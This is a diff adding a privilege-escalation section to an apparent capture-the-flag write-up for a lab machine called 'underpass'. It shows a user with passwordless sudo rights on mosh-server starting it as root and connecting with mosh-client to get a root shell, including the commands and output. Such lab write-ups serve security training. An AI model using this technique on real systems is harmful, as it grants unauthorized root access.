@@ -353,6 +353,46 @@ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
 
 Last login: Thu Dec 12 15:45:42 2024 from 10.10.14.65
 svcMosh@underpass:~$ 
+```
 
+# **Privilege Escalation**
+
+First lets run *sudo -l* to see if our user has any permissions
+
+```bash
+svcMosh@underpass:~$ sudo -l
+Matching Defaults entries for svcMosh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svcMosh may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/bin/mosh-server
+```
+
+Looks like we have sudo rights on the binary */usr/bin/mosh-server*
+
+Lets see what it does by running:
+
+```bash
+man /usr/bin/mosh-server
+```
+
+The Example section shows you how to run the binary.
+
+## **Spawn Root Shell Using Mosh**
+
+```bash
+svcMosh@underpass:~$ sudo /usr/bin/mosh-server
+
+
+MOSH CONNECT 60001 iCMGVk/UlIUfP6QDf7ulrg
+
+mosh-server (mosh 1.3.2) [build mosh 1.3.2]
+Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+[mosh-server detached, pid = 2429]
+svcMosh@underpass:~$ MOSH_KEY=iCMGVk/UlIUfP6QDf7ulrg mosh-client 127.0.0.1 60001
 ```
 
